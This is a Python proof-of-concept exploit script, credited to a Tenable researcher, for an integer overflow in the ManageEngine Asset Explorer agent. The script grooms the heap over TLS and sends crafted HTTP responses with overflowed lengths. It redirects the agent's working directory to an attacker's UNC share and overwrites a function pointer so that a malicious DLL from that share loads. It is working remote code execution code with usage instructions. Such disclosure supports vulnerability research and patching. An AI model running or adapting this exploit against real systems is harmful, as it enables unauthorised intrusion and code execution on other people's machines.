# David Wells
# Tenable
# 06/11/2021
# Remotely Exploits Integer Overflow in Asset Explorer
# This expects a publicly available share on attacker's machine of "\\<host_ip>\a" before execution. 
# In an attack scenario, this shared folder would host a malicious dll named "MSPDB80.dll"

import socket, ssl, sys

HOST_HTTP_PORT = 8000
AGENT_TLS_PORT = 9000
http_socket = None

def get_overflowed_size(size):
    return int((0xffffffff/4) + size)


def init_tls_sock():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    tls_sock = ssl.wrap_socket(s,
                                keyfile="key.pem",
                               server_side=False,
                               certfile='localhost.pem',
                               ssl_version=ssl.PROTOCOL_TLS)
    
    return tls_sock

def init_http_sock(host_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host_ip, HOST_HTTP_PORT))
    s.listen(5)
    return s

def recv_send_http(s, response):
    conn, addr = s.accept()
    conn.recv(1024)
    conn.send(response)
    
def send_tls(agent_ip, payload):
    s = init_tls_sock() 
    s.connect((agent_ip, 9000))
    s.send(payload)
    s.close()


def main(agent_ip, host_ip):
    http_sock = init_http_sock(host_ip)
    currDir_spray = "{}//UNC//{}/a/".format("//."*40, host_ip)
    funcPtr_spray = "\x50\x15\x47\x00"
    www_currDir_payload = "{}\x24\x1f\x4b\x00\xf8".format("\xfd"*0x28)
    www_funcPtr_payload = "{}\xfc\x2b\x4b\x00\x80\xf0".format("\xfd"*0x28)
    
    currDir_tls_groom = "XXXXXXXX1#X#X#XXXXXXXX3#XXXXXXXX2#{}".format(currDir_spray).encode('latin1')  
    print("[+] Prepping Heap") 
    for i in range(6):
        send_tls(agent_ip, currDir_tls_groom)
        recv_send_http(http_sock, "HTTP/1.1 200 OK\nContent-Length: {}\n\n{}".format(get_overflowed_size(5), "AAAAAA").encode('latin1') )
    
    print("[+] Exploiting Integer Overflow")
    for i in range(20):
        send_tls(agent_ip, currDir_tls_groom)
        recv_send_http(http_sock, "HTTP/1.1 200 OK\nContent-Length: {}\n\n{}".format(get_overflowed_size(5), www_currDir_payload).encode('latin1') )
    
    print("[+] Overwritting current working directory")
    send_tls(agent_ip, "A#A#A#NEWSCAN#{}".format(currDir_spray).encode('latin1'))
    recv_send_http(http_sock, "HTTP/1.1 200 OK\nContent-Length: {}\n\n{}".format(4, "true").encode('latin1'))

    print("[+] Overwritting heap failure function pointer")
    currDir_tls_groom = "X0#XXXXXXXX1#XXXXXXXX2#XX3#XXXXXXXX4#XXXXXXXX5".encode('latin1')  
    for i in range(22):
        send_tls(agent_ip, currDir_tls_groom)
        recv_send_http(http_sock, "HTTP/1.1 200 OK\nContent-Length: {}\n\n{}".format(get_overflowed_size(5), www_funcPtr_payload).encode('latin1') )

   
    print("[+] Triggering heap failure")
    send_tls(agent_ip, currDir_tls_groom)
    recv_send_http(http_sock, "HTTP/1.1 200 OK\nContent-Length: {}\n\n{}".format(get_overflowed_size(5), "{}".format(funcPtr_spray*0x90000)).encode('latin1') )
    
def Usage():
    print("Usage: manageEngine_integeroverflow.py <Agent_IP> <Our_IP>")

if __name__ == "__main__":
    if(len(sys.argv) != 3):
        Usage()
        exit(0)
    main(sys.argv[1], sys.argv[2])
